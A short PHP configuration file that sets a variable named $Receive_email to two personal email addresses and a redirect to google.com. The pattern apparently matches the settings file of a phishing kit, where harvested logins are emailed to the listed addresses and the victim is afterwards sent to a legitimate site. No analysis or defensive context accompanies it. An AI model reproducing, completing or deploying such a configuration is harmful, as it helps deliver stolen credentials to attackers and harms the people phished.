<?php 
$Receive_email="markrosen289@gmail.com, done2kk@protonmail.com";
$redirect="https://www.google.com/";
?>